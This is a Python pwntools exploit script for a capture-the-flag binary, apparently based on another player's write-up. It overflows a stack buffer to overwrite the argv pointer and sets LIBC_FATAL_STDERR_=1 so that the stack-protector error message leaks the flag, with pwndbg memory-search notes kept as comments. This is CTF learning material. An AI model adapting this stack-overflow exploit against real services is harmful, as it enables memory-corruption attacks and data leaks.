# -*- coding: utf-8 -*-

# Based on the polym's writeup.

# socat TCP-LISTEN:8888,reuseaddr,fork SYSTEM:./readme.bin,stderr

from pwn import *

r = remote('localhost', 8888)
#r = process('./readme.bin')
#gdb.attach(r, '''
#b *0x4006d0
#'''
#)

'''
pwndbg> search -t string "/home/z/ctfs/readme/readme.bin"
warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d1e, halting search.
[stack]         0x7fffffffe14d 0x2f7a2f656d6f682f ('/home/z/')
[stack]         0x7fffffffef19 0x2f7a2f656d6f682f ('/home/z/')
[stack]         0x7fffffffefd9 0x2f7a2f656d6f682f ('/home/z/')

pwndbg> search -t qword 0x7fffffffe14d
warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d07, halting search.
libc-2.23.so    0x7ffff7dd23d8 0x7fffffffe14d <-- !!!
[stack]         0x7fffffffdd48 0x7fffffffe14d 

pwndbg> search -t qword 0x7fffffffef19
warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d07, halting search.
pwndbg> search -t qword 0x7fffffffefd9
warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d07, halting search.
[stack]         0x7fffffffe100 0x7fffffffefd9

pwndbg> x/16wx 0x7ffff7dd23d8 <-- !!!
0x7ffff7dd23d8 <program_invocation_name>:   0xffffe14d  0x00007fff  0x00000000  0x00000000
0x7ffff7dd23e8 <default_overflow_region+8>: 0x00000001  0x00000000  0x00000002  0x00000000
0x7ffff7dd23f8 <default_overflow_region+24>:    0xf7dd4498  0x00007fff  0x00000000  0x00000000
0x7ffff7dd2408 <default_overflow_region+40>:    0xffffffff  0xffffffff  0xf7dcf8e0  0x00007fff

pwndbg> distance 0x7fffffffdb30 0x7fffffffdd48
0x7fffffffdb30->0x7fffffffdd48 is 0x218 bytes (0x43 words)

'''

if __name__ == "__main__":
    junk = r.recvuntil("What's your name? ")

# "Fun with FORTIFY_SOURCE", http://seclists.org/bugtraq/2010/Apr/243
# argv & envp on stack, http://softwaretechnique.jp/OS_Development/Supplement/Binary/elf_stack.html
# 0x600d20 is obvious.
# 0x400d20... Why does ELF loader duplicate the string? I will figure it out later (binfmt_elf.c)

    payload = "A" * 0x218 + p64(0x400d20) + p64(0) + p64(0x600d20) + '\n'
    r.send(payload)
    
    junk += r.recvuntil("Please overwrite the flag: ")
    r.sendline("LIBC_FATAL_STDERR_=1\0") # StackOverflow, "How to redirect RUNTIME ERRORS to STDERR?"

    junk += r.recvall()
    print junk

